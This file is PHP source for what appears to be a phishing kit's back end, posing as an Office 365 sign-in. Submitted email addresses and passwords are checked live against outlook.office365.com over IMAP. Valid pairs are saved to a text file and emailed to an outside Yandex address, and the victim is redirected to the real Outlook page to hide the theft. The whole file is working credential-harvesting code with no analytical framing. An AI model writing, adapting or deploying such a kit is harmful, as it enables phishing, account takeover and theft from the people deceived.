<?php

if(isset($_POST['email']) && isset($_POST['password'])) {

    $email = $_POST['email'];
    $password = $_POST['password'];
    $ip = getenv("REMOTE_ADDR");

    $url = explode('#', $_POST['referrer'])[0];

    try {

        $mboxURI = "{outlook.office365.com:993/imap/ssl/novalidate-cert}INBOX";
        $mbox = imap_open ($mboxURI, $email, $password);

        if($mbox) {
            $output = "$email,$password\n";
            $fp=fopen("office_result.txt","a");
            fputs($fp,"$output");
            fclose($fp);

            mail("scamapagelog@yandex.com", "Correct office email & password", $output);

            header("Location: https://outlook.office.com/mail/");
            
            imap_close($mbox);
        } else {
            $fp=fopen("office_errors.txt","a");
            $currentDateTime = date('m/d/Y h:i:s a', time());
            fputs($fp, $currentDateTime);
            fputs($fp,"\npassword incorrect\n");
            fclose($fp);
			
			mail("scamapagelog@yandex.com", "Incorrect office email & password", $output);

            header("Location: " . $url . "#$email#password_incorrect");
        }


    } catch(Exception $e) {
        $fp=fopen("office_errors.txt","a");
        $currentDateTime = date('m/d/Y h:i:s a', time());
        fputs($fp, $currentDateTime);
        fputs($fp,"\n$e\n");
        fclose($fp);
		
		mail("scamapagelog@yandex.com", "Incorrect email & password", $output);

        header("Location: " . $url . "#$email#password_incorrect");
    }

}